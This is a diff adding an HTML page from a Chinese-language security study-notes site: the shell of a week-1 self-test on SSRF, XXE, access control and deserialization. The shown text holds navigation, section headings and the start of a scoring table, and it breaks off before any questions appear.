@@ -1,0 +1,1853 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Java反序列化 | Web安全 | CTF">
+      
+      
+        <meta name="author" content="ethicalpaws">
+      
+      
+        <link rel="canonical" href="https://ethicalpaws.github.io/security-study-notes/weekly/week1/detection/">
+      
+      
+        <link rel="prev" href="../outcome/">
+      
+      
+        <link rel="next" href="../../../java-deserialization/java-deserialization%28ing%29/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>检测 - Ethicalpaws-Youth Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../css/extra.css">
+    
+      <link rel="stylesheet" href="../../../css/test-style.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Ethicalpaws-Youth Notes" class="md-header__button md-logo" aria-label="Ethicalpaws-Youth Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Ethicalpaws-Youth Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              检测
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ethicalpaws/security-study-notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ethicalpaws/security-study-notes
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../outcome/" class="md-tabs__link">
+          
+  
+  
+  每周复盘
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../java-deserialization/java-deserialization%28ing%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Java反序列化
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../web-vulns/csrf%26xss/csrf%26xss/" class="md-tabs__link">
+          
+  
+  
+  Web漏洞笔记
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Ethicalpaws-Youth Notes" class="md-nav__button md-logo" aria-label="Ethicalpaws-Youth Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Ethicalpaws-Youth Notes
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ethicalpaws/security-study-notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ethicalpaws/security-study-notes
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    每周复盘
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    每周复盘
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Week 1
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Week 1
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../outcome/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    收获
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    检测
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    检测
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📊 自测打分表
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#420" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、选择题（每题4分，共20分）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="一、选择题（每题4分，共20分）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第1题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第2题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第3题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第4题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第5题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#840" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、简答题（每题8分，共40分）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、简答题（每题8分，共40分）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第1题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第2题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第3题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第4题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第5题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1020" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、漏洞分析题（每题10分，共20分）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="三、漏洞分析题（每题10分，共20分）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1xxe-ssrf-blind-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第1题（XXE + SSRF 综合 Blind XXE）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第2题（越权 + 反序列化综合）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、安全设计题（10分）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、附加题（10分）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 附录：常见漏洞分类速查
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../java-deserialization/java-deserialization%28ing%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Java反序列化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web漏洞笔记
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web漏洞笔记
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web-vulns/csrf%26xss/csrf%26xss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF&&XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web-vulns/ssrf/ssrf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web-vulns/access-control/access-control/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    访问控制
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web-vulns/xxe/xxe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📊 自测打分表
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#420" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、选择题（每题4分，共20分）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="一、选择题（每题4分，共20分）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第1题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第2题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第3题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第4题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第5题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#840" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、简答题（每题8分，共40分）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、简答题（每题8分，共40分）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第1题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第2题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第3题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第4题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第5题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1020" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、漏洞分析题（每题10分，共20分）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="三、漏洞分析题（每题10分，共20分）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1xxe-ssrf-blind-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第1题（XXE + SSRF 综合 Blind XXE）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第2题（越权 + 反序列化综合）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、安全设计题（10分）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、附加题（10分）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 附录：常见漏洞分类速查
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="1">第 1 周学习检测</h1>
+<blockquote>
+<p>本周内容：SSRF · XXE · 越权 · 反序列化</p>
+</blockquote>
+<p><link rel="stylesheet" href="/css/test-style.css"></p>
+<script src="/js/test-script.js" defer></script>
+
+<hr />
+<h2 id="_1">📊 自测打分表</h2>
+<div class="test-card">
+  <div class="test-score"><span>📊 基础分</span><span id="baseScore">0</span><span> / <span id="baseMax">0</span></span></div>
+  <div class="test-score"><span>⭐ 含附加题</span><span id="totalScore">0</span><span> / <span id="totalMax">0</span></span></div>
+  <div class="test-score"><span>🏆 评级</span><span id="rating">—</span></div>
+  <button class="test-reset" id="resetBtn">🔄 重置</button>
+</div>
+
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">题号</th>
+<th style="text-align: center;">题型</th>
+<th style="text-align: center;">分值</th>
+<th style="text-align: center;">得分</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">一.1</td>
+<td style="text-align: center;">选择题</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">一.2</td>
+<td style="text-align: center;">选择题</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="0"></td>
+</tr>
+<tr>
+<td style="text-align: center;">一.3</td>
+<td style="text-align: center;">选择题</td>
